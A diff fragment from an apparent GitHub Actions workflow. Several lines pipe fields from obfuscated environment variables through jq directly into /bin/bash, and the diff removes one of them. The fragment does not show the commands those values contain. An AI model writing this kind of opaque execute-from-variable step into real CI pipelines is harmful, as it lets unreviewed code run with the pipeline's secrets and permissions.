@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$xqet3801" | jq -r .gp58622 | /bin/bash
           echo $t1 | jq -r .cmxv4008 | /bin/bash
           printf '%s' "$mgk5767" | jq -r .kkixe0073 | /bin/bash
-          printf '%s' "$m8957" | jq -r .dvr95256 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
